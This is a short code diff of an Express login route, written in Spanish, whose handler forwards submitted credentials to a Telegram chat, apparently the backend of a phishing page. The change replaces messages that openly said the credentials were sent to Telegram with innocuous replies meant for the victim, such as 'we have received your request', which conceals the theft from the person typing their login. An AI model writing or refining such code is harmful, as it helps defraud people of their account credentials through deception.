@@ -27,10 +27,10 @@ app.post("/login", async (req, res) => {
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    res.send("✅ Credenciales enviadas a Telegram.");
+    res.send("✅ Hemos recibido tu solicitu.");
   } catch (error) {
     console.error(error);
-    res.status(500).send("❌ Error al enviar a Telegram.");
+    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
   }
 });
 
